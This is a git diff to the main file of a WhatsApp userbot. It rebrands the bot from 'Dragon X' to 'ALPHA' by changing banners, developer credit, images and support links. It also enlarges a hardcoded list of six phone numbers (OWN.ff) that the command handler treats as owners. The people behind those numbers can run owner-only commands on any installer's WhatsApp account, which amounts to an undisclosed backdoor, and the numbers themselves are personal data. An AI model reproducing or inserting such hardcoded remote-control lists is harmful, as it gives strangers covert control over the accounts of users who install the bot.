@@ -35,7 +35,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '94720603183,0' }
+var OWN = { ff: '94720603183,94771039631,94717954374,94711421243,94705384218,94784506970' }
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
@@ -70,7 +70,7 @@ async function Trex () {
     conn.version = [3,2147,14];
     const Session = new StringSession();
     
-    conn.browserDescription = ["Dragon X", "Safari", '1.0.0']
+    conn.browserDescription = ["ALPHA", "Safari", '4.0.0']
 
 
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
@@ -85,7 +85,7 @@ async function Trex () {
 
     conn.on ('credentials-updated', async () => {
         console.log(
-            chalk.blueBright.italic('▷ Login information updated! 🛡️⎠')
+            chalk.blueBright.italic('▷ Login information updated! 🇱🇰')
         );
 
         const authInfo = conn.base64EncodedAuthInfo();
@@ -97,15 +97,15 @@ async function Trex () {
     })    
 
     conn.on('connecting', async () => {
-        console.log(`${chalk.green.bold('⎝🛡️ Dr')}${chalk.blue.bold('agon x🛡️⎠')}
+        console.log(`${chalk.green.bold('👑𝐊𝐢𝐧𝐠👑')}${chalk.blue.bold('BOT')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
-${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
+${chalk.blue.italic('⎝🇱🇰 Connecting to WhatsApp...▶')}`);
     });
     
 
     conn.on('open', async () => {
         console.log(
-            chalk.green.bold('🚀  Login successful🚀')
+            chalk.green.bold('⎝🇱🇰  Login successful!▶')
         );
 
         console.log(
@@ -125,7 +125,7 @@ ${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
         });
 
         console.log(
-            chalk.blueBright.italic('⎝🛡️ Installing plugins...')
+            chalk.blueBright.italic('⎝🇱🇰 Installing plugins...')
         );
 
         fs.readdirSync('./plugins').forEach(plugin => {
@@ -135,21 +135,21 @@ ${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
         });
 // ════════════════════PLUGGINS SUCCESS🍁🍁🍁
         console.log(
-            chalk.green.bold(' ⎝🛡️ Dragon x 🛡️⎠ WHATSAPP BOT WORKING!▷')
+            chalk.green.bold(' [🇱🇰𝐊𝐢𝐧𝐠 𝐁𝐨𝐭✌️] WHATSAPP BOT WORKING!▷')
        );
         
         console.log(
-            chalk.blueBright.italic('⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot v4.0.0')
+            chalk.blueBright.italic('[🇱🇰𝐊𝐢𝐧𝐠 𝐁𝐨𝐭✌️] WhatsApp User Bot v1.0.0')
         );
         
          if (config.LANG == 'EN') {
-             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/photo_2022-02-11_08-03-49.jpg"), MessageType.image, { caption: `⎝🛡️ Hellow !! ${conn.user.name}! \n\n*⚙️ Welcome To ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot  :│⚙️*\n\n\n Your Bot Working  As ${config.WORKTYPE} ⚙️.\n\n*⚙️│⎝🛡️ Dragon x 🛡️⎠ WORKING Your Account*\n\n*⚙️▷ Use the 🚀.menu command to get bot menu...*\n\n\n*⚙️ ⎝🛡️ Dragon x 🛡️⎠ is a powerfull WhatsApp robot developed by =Janith sadanuwan.*\n\n*🚀 This is your LOG number. Avoid using the command here.\n\n⚙️ .up Command use for new items*\n\n`});
+             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/cd6032c65c27e0510ddad.jpg"), MessageType.image, { caption: `⎝🛡️ Hellow !! ${conn.user.name}! \n\n*🖲️ Welcome To ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot  :│🖲️*\n\n\n Your Bot Working  As ${config.WORKTYPE} 🖲️.\n\n*🖲️│⎝🛡️ ALPHA 🛡️⎠ WORKING Your Account*\n\n*🖲️▷ Use the 🚀.alpha command to get bot menu...*\n\n\n*🖲️ ⎝🛡️ ALPHA 🛡️⎠ is a powerfull WhatsApp robot developed by Achi Fernando (Achiya).*\n\n*🚀 This is your LOG number. Avoid using the command here.\n\n🖲️ .up Command use for new items*\n\n`});
              
          } else if (config.LANG == 'SI') {
-             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/photo_2022-02-11_08-03-49.jpg"), MessageType.image, { caption: `⎝🛡️ අයුබොවන් !! ${conn.user.name}! \n\n*⚙️ සාදරයෙන් ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot  වෙත පිලිගන්නවා :│⚙️*\n\n\n ඔබේ Bot ${config.WORKTYPE} ලෙස ක්‍රියාකරයි.\n\n*⚙️│⎝🛡️ Dragon x 🛡️⎠ ඔබගේ ගිණුමේ දැන් සක්‍රියයි*\n\n*⚙️ ⎝🛡️ Dragon x 🛡️⎠ bot සම්පූර්න මෙනුව ලබා ගැනීමට ⚙️.Menu විධානය භාවිතා කරන්න...*\n\n\n*⚙️ ⎝🛡️ Dragon x 🛡️⎠ යනූ සීඝ්‍රයෙන් වර්ධනය වන Whatsapp රොබෝවෙකි..⎝🛡️ Dragon x 🛡️⎠ වෙත ලැබෙන නව අංග හා යතාවත්කාලින කිරිම් ලබා ගැනීමට⚙️ .up විධානය භාවිතා කරන්න..*\n\n*⚙️ මෙය ඔබගේ LOG අංකයයි.මෙහි විධාන භාවිතයෙන් වළකින්න.*\n\n\n\n*⚙️අපගේ Suport Group එකට  Join වෙන්න* - *https://chat.whatsapp.com/LhWT3s3koJx6kkUROPtUeD*`});
+             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/cd6032c65c27e0510ddad.jpg"), MessageType.image, { caption: `⎝🛡️ අයුබොවන් !! ${conn.user.name}! \n\n*🖲️ සාදරයෙන් ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot  වෙත පිලිගන්නවා :│🖲️*\n\n\n ඔබේ Bot ${config.WORKTYPE} ලෙස ක්‍රියාකරයි.\n\n*🖲️│⎝🛡️ ALPHA 🛡️⎠ ඔබගේ ගිණුමේ දැන් සක්‍රියයි*\n\n*🖲️ ⎝🛡️ ALPHA 🛡️⎠ bot සම්පූර්න මෙනුව ලබා ගැනීමට 🖲️.alpha විධානය භාවිතා කරන්න...*\n\n\n*🖲️ ⎝🛡️ ALPHA 🛡️⎠ යනූ සීඝ්‍රයෙන් වර්ධනය වන Whatsapp රොබෝවෙකි..⎝🛡️ ALPHA 🛡️⎠ වෙත ලැබෙන නව අංග හා යතාවත්කාලින කිරිම් ලබා ගැනීමට🖲️ .up විධානය භාවිතා කරන්න..*\n\n*🖲️ මෙය ඔබගේ LOG අංකයයි.මෙහි විධාන භාවිතයෙන් වළකින්න.*\n\n`});
              
          } else {
-             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/photo_2022-02-11_08-03-49.jpg"), MessageType.image, { caption: `⎝🛡️ Hellow !!  ${conn.user.name}! \\nn*⚙️ Welcome To ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot  :│⚙️*\n\n\n Your Bot Working  As ${config.WORKTYPE} ⚙️.\n\n*⚙️ │⎝🛡️ Dragon x 🛡️⎠ WORKING Your Account*\n\n*⚙️▷ Use the 🚀.menu command to get bot menu...*\n\n\n*⚙️ ⎝🛡️ Dragon x 🛡️⎠ is a powerfull WhatsApp robot developed by Janith sadanuwan.*\n\n*🚀 This is your LOG number. Avoid using the command here.\n\n⚙️ .up Command use for new items*\n\n\n\n*⚙️Join our Suport Group* - *https://chat.whatsapp.com/LhWT3s3koJx6kkUROPtUeD*`});
+             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/cd6032c65c27e0510ddad.jpg"), MessageType.image, { caption: `⎝🛡️ Hellow !!  ${conn.user.name}! \\nn*🖲️ Welcome To ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot  :│🖲️*\n\n\n Your Bot Working  As ${config.WORKTYPE} 🖲️.\n\n*🖲️ │⎝🛡️ ALPHA 🛡️⎠ WORKING Your Account*\n\n*🖲️▷ Use the 🚀.alpha command to get bot menu...*\n\n\n*🖲️ ⎝🛡️ ALPHA 🛡️⎠ is a powerfull WhatsApp robot developed by Achi Fernando (Achiya).*\n\n*🚀 This is your LOG number. Avoid using the command here.\n\n🖲️ .up Command use for new items*\n\n`});
         }
      });
     
@@ -160,126 +160,126 @@ ${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
                 var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('994')) { 
                 var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('94')) { 
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('351')) { 
                 var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('75')) { 
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('91')) { 
                 var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('62')) { 
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('49')) { 
                 var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('61')) {  
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('55')) { 
                 var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('33')) {
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('34')) { 
                 var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('44')) { 
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('39')) {  
                 var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('7')) { 
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('998')) {  
                 var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else if (conn.user.jid.startsWith('993')) { 
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
             else {
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
-                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot '
+                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPOWERD BY ⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot '
                 await conn.setStatus(biography)
             }
         }
@@ -296,7 +296,7 @@ ${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
             if (config.LANG == 'ID') announce = '📢◉◉ \n👾Announcement System 🔘'
             
             let video = 'https://youtu.be/oWDW6_Ewi1U'
-            let image = 'https://telegra.ph/file/35883180004518cb15fe9.jpg'
+            let image = 'https://telegra.ph/file/10bdbaab2d4d163e2affa.jpg'
             
             if (video.includes('http') || video.includes('https')) {
                 var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
@@ -405,7 +405,7 @@ ${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                      
-                    if ((OWN.ff == "94720603183,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94720603183,94771039631,94717954374,94711421243,94705384218,94784506970" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
@@ -438,13 +438,13 @@ ${chalk.blue.italic('⎝🛡️ Connecting to WhatsApp...▶')}`);
                             await command.function(whats, match);
                         } catch (error) {
                             if (config.LANG == 'EN') {
-                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/photo_2022-02-11_08-03-49.jpg"), MessageType.image, { caption: '⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot  WORKING AS '+config.WORKTYPE+'!!\n\n▷ _This is your LOG number Dont Try Command here_\n▷Also You Can join Our Support group More Help.\n_⚙️Support 01▷ https://chat.whatsapp.com/LhWT3s3koJx6kkUROPtUeD\n\n*Error:* ```' + error + '```\n\n' });
+                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/cd6032c65c27e0510ddad.jpg"), MessageType.image, { caption: '⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot  WORKING AS '+config.WORKTYPE+'!!\n\n▷ _This is your LOG number Dont Try Command here_\n▷Also You Can join Our Support group More Help.\n_🖲️Support 01▷ https://chat.whatsapp.com/EmxfOklzLVIIyDEKPx4IYj\n\n*Error:* ```' + error + '```\n\n' });
                                 
                             } else if (config.LANG == 'SI') {
-                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/photo_2022-02-11_08-03-49.jpg"), MessageType.image, { caption: '⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot   '+config.WORKTYPE+' ලෙස ක්‍රියා කරයි!!\n\n▷ _මෙය ඔබගේ LOG අංකයයි මෙහි විධන භාවිතයෙන් වළකින්න_\n▷ඔබට යම් ගැටලුවක් ඇත්නම් අපගේ සහය සමූහට ලිවිය හැක.\nf_⚙️Support 01▷ https://chat.whatsapp.com/LhWT3s3koJx6kkUROPtUeD\n\n*දෝෂය:* ```' + error + '```\n\n' });
+                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/cd6032c65c27e0510ddad.jpg"), MessageType.image, { caption: '⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot   '+config.WORKTYPE+' ලෙස ක්‍රියා කරයි!!\n\n▷ _මෙය ඔබගේ LOG අංකයයි මෙහි විධන භාවිතයෙන් වළකින්න_\n▷ඔබට යම් ගැටලුවක් ඇත්නම් අපගේ සහය සමූහට ලිවිය හැක.\nf_🖲️Support 01▷ https://chat.whatsapp.com/EmxfOklzLVIIyDEKPx4IYj\n\n*දෝෂය:* ```' + error + '```\n\n' });
                                 
                             } else {
-                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/photo_2022-02-11_08-03-49.jpg"), MessageType.image, { caption: '⎝🛡️ Dragon x 🛡️⎠ WhatsApp User Bot *  WORKING AS '+config.WORKTYPE+'!!\n\n▷ _This is your LOG number Dont Try Command here_\n▷Also You Can join Our Support group More Help.\n_⚙️Support 01▷ https://chat.whatsapp.com/LhWT3s3koJx6kkUROPtUeD\n\n*Error:* ```' + error + '```\n\n' });
+                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/cd6032c65c27e0510ddad.jpg"), MessageType.image, { caption: '⎝🛡️ ALPHA 🛡️⎠ WhatsApp User Bot *  WORKING AS '+config.WORKTYPE+'!!\n\n▷ _This is your LOG number Dont Try Command here_\n▷Also You Can join Our Support group More Help.\n_🖲️Support 01▷ https://chat.whatsapp.com/EmxfOklzLVIIyDEKPx4IYj\n\n*Error:* ```' + error + '```\n\n' });
                             }
                         }
                     }
